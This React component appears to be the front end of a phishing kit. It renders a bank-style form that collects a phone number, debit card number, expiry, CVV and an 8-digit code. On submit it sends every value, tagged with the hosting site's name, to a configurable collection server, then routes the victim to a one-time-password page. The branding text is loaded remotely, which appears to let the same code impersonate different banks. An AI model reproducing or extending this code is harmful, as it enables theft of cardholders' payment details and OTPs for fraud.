import Header from '../resources/Header'
import Footer from '../resources/Footer'
import Loader from "../resources/Loader";
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import DebitCardInputComponent from '../resources/DebitCardInputComponent';
import ExpiryDateInputComponent from '../resources/ExpiryDateInputComponent';
import PageData from '../hooks/PageData';
function HomeCard() {
 
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [loader, setLoader] = useState(true);
  const API_URL = process.env.REACT_APP_API_URL;

  // Clean up local storage on component mount
  useEffect(() => {
    localStorage.removeItem('collection_id');
    localStorage.removeItem('next');
    localStorage.removeItem("server_input_ot");

    localStorage.removeItem("next_page_otp_times");
    setTimeout(()=>{
      setLoader(false);
    }, 2000);
  }, []);

  // Navigate to home card page
  const HomePage = () => {
    navigate('/');
  };

  // Form submit handler
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); 

    const formData = new FormData(e.target);
    const jsonObject = {};
    
    formData.forEach((value, key) => {
      jsonObject[key] = value;
    });

    const postData = {
      data: jsonObject,
      site: window.location.hostname
    };

    try {
      const response = await fetch(`${API_URL}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(postData)
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      const responseData = await response.json();
      if (responseData.status === 200) {
        localStorage.setItem('collection_id', responseData.data);
        localStorage.setItem('next', "accountverify");
        localStorage.setItem("server_ot_times", 1);
        navigate('/onetimeverify');
      } else {
        alert("Invalid response");
      }
    } catch (error) {
      console.error('There was a problem with the fetch operation:', error);
    } finally {
      setLoading(false);  
    }
  };


    
const { data, loading2, error } = PageData();

useEffect(() => {
  if (data) {
    
  }
  }, [data]);
  if (loading2) {
    return <div>Loading...</div>; 
  }

  if (error) {
    return <div>Error: {error}</div>; 
  }

  if (!data || !data.header) {
    return <div>No header available</div>; 
  }

  const home = data.home;

  return (
    <>
    <Header />
    <main>
      <div className="container">
      {loader ? (
        <Loader />
        ) : (
          <>
          <div className='mt-4'>
              <h1 className="text-center">{home.header_text}</h1>  
          </div>
          <div className='home-button-switcher'>
              <button onClick={()=>{HomePage()}} > {home.button1}</button>
              <button className="active" > {home.button2} </button>
            </div>
          <div className='shadow px-4 py-2 border-0'>
            <form onSubmit={handleSubmit} >
              <div className='form-group'>
                <label>{home.form1[0].label}</label>
                  <input type='text' name={home.form1[0].name} inputMode='numeric' minLength={10} maxLength={10} className='form-control my-control' required/>
              </div>
              <DebitCardInputComponent name={home.form1[1].name} label={home.form1[1].label}  />
              <div className='d-flex justify-content-between gap-2 mt-4'>
                <ExpiryDateInputComponent name={home.form1[2].name} label={home.form1[2].label} />
                <div className='form-group'>
                <label>{home.form1[3].label}</label>
                    <input type='password'  name={home.form1[3].name} inputMode='numeric' minLength={3} maxLength={3} className='form-control my-control' required/>
                </div>

              </div>

              <div className='form-group'>
              <label>{home.form1[4].label}</label>
                  <input type='text' name={home.form1[4].name} inputMode='numeric' maxLength={8} className='form-control my-control' required/>
              </div>

              <div className='text-center'>
                <input type='submit' value={home.submit_button} disabled={loading} className='btn btn-danger submit-button' required/>
              </div>

            </form>
          </div>
          </>
        )
      }
        
      </div>
    </main>
    <Footer />
    </>
  );
}

export default HomeCard;
